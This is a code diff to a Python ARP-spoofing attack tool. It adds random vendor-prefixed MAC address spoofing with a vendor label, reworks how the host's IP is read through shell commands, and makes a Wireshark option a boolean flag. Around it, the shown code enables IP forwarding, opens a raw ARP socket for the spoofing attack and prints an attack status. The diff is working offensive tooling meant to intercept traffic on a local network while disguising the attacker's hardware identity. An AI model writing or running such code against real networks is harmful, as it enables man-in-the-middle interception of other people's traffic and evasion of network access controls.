@@ -47,21 +47,39 @@ class Spoofing_arp:
 
       def mac_change(self):
 
-          command  = "ifconfig  "+ self.args.Interface + " | grep ether"
+          mac_list =  ['FC:0F:E6:','00:12:EE:','00:1E:DC:','78:84:3C:',
+                       '00:26:B9:','14:FE:B5:','BC:30:5B:','D0:67:E5:',
+                       '10:1D:C0:','78:25:AD:','A0:0B:BA:','E8:11:32:',
+                       'F8:1E:DF:','E0:F8:47:','A4:B1:97:','7C:6D:62:',
+                        '00:0A:F3:','00:0C:86:','B4:A4:E3:','FC:FB:FB:',
+                      ] 
+                              
+          Mac_list= random.choice(mac_list)                  
+          Mac_Cook  ="".join( f'{random.randrange(16**8):x}')
+          Mac_Host = ':'.join(Mac_Cook[i:i+2] for i in range(0,6,2)).upper()
+          self.Mac_addr =  Mac_list + Mac_Host  
+          command  = "ifconfig  "+self.args.Interface + " | grep ether"
           Current_Mac_P = subprocess.check_output (command,shell=True).decode('utf-8')
           Current_Mac_C = re.compile(r'(?:[0-9a-fA-F]:?){12}')
           Current_Mac_F = re.findall(Current_Mac_C , Current_Mac_P)
           self.Current_Mac_G = str("".join(Current_Mac_F[0]))
-          with open ("./arppacket/mac_address.txt",'r') as mac_changer :
-               mac_list = mac_changer.readlines()
-          self.mac_addr = random.choice(mac_list)
           ifconfig_down = "sudo ifconfig "+self.args.Interface+" down"
-          ifconfig_mac_change = "sudo ifconfig "+self.args.Interface+ " hw ether "+str(self.mac_addr)
+          ifconfig_mac_change = "sudo ifconfig "+self.args.Interface+ " hw ether "+self.Mac_addr
           ifconfig_up = "sudo ifconfig "+self.args.Interface+" up"
           os.system(ifconfig_down)
-          os.system(ifconfig_mac_change)
-          os.system(ifconfig_up)
-
+          config  = os.system(ifconfig_mac_change)
+          os.system(ifconfig_up) 
+          if   Mac_list in str("".join(mac_list[0:4]))  :
+               self.vendor_chanage = 'Sony'
+          elif Mac_list in   str("".join(mac_list[4:8])) :
+                self.vendor_chanage = 'Dell'
+          elif Mac_list in str("".join(mac_list[8:12]))  :
+                self.vendor_chanage = 'Samsung'
+          elif Mac_list in str("".join(mac_list[12:16])) :
+                self.vendor_chanage = 'Apple'     
+          elif Mac_list in str("".join(mac_list[16:20])) :
+                self.vendor_chanage = 'Cisco'  
+                    
       def Host_info(self):
 
            command  = "ifconfig "+self.args.Interface+" | grep 'ether'"
@@ -71,15 +89,13 @@ class Spoofing_arp:
            self.Mac_Interface = str("".join(FMac[0]))
            self.source_mac = binascii.unhexlify(self.Mac_Interface.replace(":",''))
            self.host_name  = socket.gethostname() 
-           self.host_ip    = str(check_output(['hostname', '--all-ip-addresses'],stderr=subprocess.PIPE)).\
-           replace("b'","").replace("'","").replace("\\n","")
-           if  " " in self.host_ip : 
-              self.host_ip = self.host_ip.split()
-              self.host_ip = str(self.host_ip[0])
-           self.HostIpBytes = socket.inet_aton(str(self.host_ip).replace("'","").replace('b',""))    
-   
-      def arpSpoofing(self):
-               
+           host_ip    = "ifconfig  "+self.args.Interface+" | egrep '([0-9]{1,3}\.){3}[0-9]{1,3}'"
+           ip_process = str(subprocess.check_output (host_ip,shell=True)).split()
+           self.host_ip =  ip_process
+           self.host_ip =str( self.host_ip [2])
+           self.HostIpBytes = socket.inet_aton(str(self.host_ip).replace("'","").replace('b',""))  
+  
+      def arpSpoofing(self):               
           try:
               os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
               SocketConnect = socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.htons(0x0806))
@@ -122,7 +138,8 @@ class Spoofing_arp:
               print("\n[*] Mac_Change Info:\n"+'*'*22)
               print("[*] Current Mac   -----------------|-> " + str(self.Current_Mac_G))
               time.sleep(0.30)
-              print("[*] New Mac       -----------------|-> " + str(self.mac_addr))
+              print("[*] New Mac       -----------------|-> " + str(self.Mac_addr))
+              print("[*] vendor Mac    -----------------|-> " + str(self.vendor_chanage))
               print('\n'+"*"*22)
               print("[*] Attck Status\n"+'*'*22)
               time.sleep(0.30)
@@ -246,7 +263,7 @@ class Spoofing_arp:
           parser.add_argument( '-M',"--dest"     )  
           parser.add_argument( '-T',"--Target"   )
           parser.add_argument( '-R',"--repate"   )
-          parser.add_argument( '-W',"--Wireshark")
+          parser.add_argument( '-W',"--Wireshark",action='store_true')
           self.args = parser.parse_args()
           if len(sys.argv)> 1 :
               pass
